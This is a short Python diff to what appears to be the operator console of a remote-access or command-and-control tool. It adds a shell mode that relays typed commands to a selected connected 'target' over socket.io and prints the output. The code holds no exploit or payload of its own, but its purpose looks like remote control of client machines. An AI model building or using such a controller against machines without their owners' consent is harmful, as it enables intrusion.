@@ -64,8 +64,12 @@ def shell():
                 case 'shell':
                     while True:
                         shellInput = str(input(f"pF/{selected_target} $"))
-                        
-
+                        if shellInput == "EXIT":
+                            break
+                        waiting = True
+                        sio.emit('sendCommand', {'command': shellInput, 'target': selected_target})
+                        while waiting:
+                            pass
         match command:
             case 'list':
                 waiting = True
@@ -89,6 +93,12 @@ def establishmentResponse(data):
 def getInfoResponse(data):
     global waiting
     print(json.dumps(data, indent=4))
+    waiting = False
+
+@sio.on('sendCommandResponse')
+def sendCommandResponse(data):
+    global waiting
+    print(data['output'])
     waiting = False
 
 @sio.on('getConnectedClientsResponse')
